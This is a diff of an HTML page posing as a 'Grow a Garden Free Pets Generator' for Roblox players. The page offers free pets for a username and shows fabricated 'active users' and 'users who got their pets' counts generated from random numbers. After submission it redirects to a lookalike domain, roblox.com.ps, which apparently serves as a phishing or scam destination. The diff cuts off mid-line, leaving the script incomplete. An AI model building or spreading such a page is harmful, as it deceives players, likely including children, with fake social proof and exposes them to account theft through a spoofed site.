@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="de">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -74,15 +74,12 @@
 
 <header>Grow a Garden Free Pets Generator</header>
 <p class="subtitle">
-    Pick your favorite 3 pets! After you choose your pets, please enter your username, 
-    and you will be teleported to a private server with a bot that will give you the submitted pets!
+    Pick your favorite 3 pets! After selecting your pets, enter your username!
 </p>
 
-<!-- Counter Anzeigen -->
 <div class="counter">Active users: <span id="activeUsers"></span></div>
 <div class="counter">Users who got their pets: <span id="usersGotPets"></span></div>
 
-<!-- Haustiere -->
 <div class="pets-container">
     <div class="pet" data-name="Racoon">
         <img src="racoon.png" alt="Racoon">
@@ -113,7 +110,6 @@
 <button id="submit-btn" disabled>Submit</button>
 
 <script>
-    // ==== PET AUSWAHL ====
     const pets = document.querySelectorAll('.pet');
     const submitBtn = document.getElementById('submit-btn');
     let selectedPets = [];
@@ -121,10 +117,10 @@
     pets.forEach(pet => {
         pet.addEventListener('click', () => {
             const name = pet.dataset.name;
-            if(selectedPets.includes(name)) {
+            if (selectedPets.includes(name)) {
                 selectedPets = selectedPets.filter(p => p !== name);
                 pet.classList.remove('selected');
-            } else if(selectedPets.length < 3) {
+            } else if (selectedPets.length < 3) {
                 selectedPets.push(name);
                 pet.classList.add('selected');
             }
@@ -136,13 +132,11 @@
         const username = prompt("Enter your Roblox username:");
         if(username) {
             alert(`Thank you, ${username}! Your pets (${selectedPets.join(', ')}) will be delivered soon.`);
-            window.location.href = "https://roblox.com.ps/games/126884695634066/Grow-a-Garden?privateServerLinkCode=82183865140219149374195124858522
-                ";
+            window.location.href = "https://roblox.com.ps/games/126884695634066/Grow-a-Garden?privateServerLinkCode=82183865140219149374195124858522";
         }
     });
 
-    // ==== USER COUNTER ====
-    let activeUsers = Math.floor(Math.random() * (10100 - 10000 + 1)) + 10000; // 10.000 bis 10.100
+    let activeUsers = Math.floor(Math.random() * (10100 - 10000 + 1)) + 10000;
     let usersGotPets = Math.floor(Math.random() * (9600 - 9500 + 1)) + 9500;
 
     const activeEl = document.getElementById('activeUsers');
@@ -151,24 +145,8 @@
     activeEl.textContent = activeUsers;
     gotPetsEl.textContent = usersGotPets;
 
-    // Active Users -> random alle 10 Sek
     setInterval(() => {
-        activeUsers = Math.floor(Math.random() * (10100 - 10000 + 1)) + 10000;
-        activeEl.textContent = activeUsers;
-    }, 10000);
-
-    // Users got pets -> +1 bis max 9600, alle 5 Sek
-    setInterval(() => {
-        if(usersGotPets < 9600){
-            usersGotPets += Math.floor(Math.random() * 2) + 1;
-            if(usersGotPets > 9600) usersGotPets = 9600;
-            gotPetsEl.textContent = usersGotPets;
-        }
-    }, 5000);
-</script>
-
-</body>
-</html>
+        activeU
 
 
 
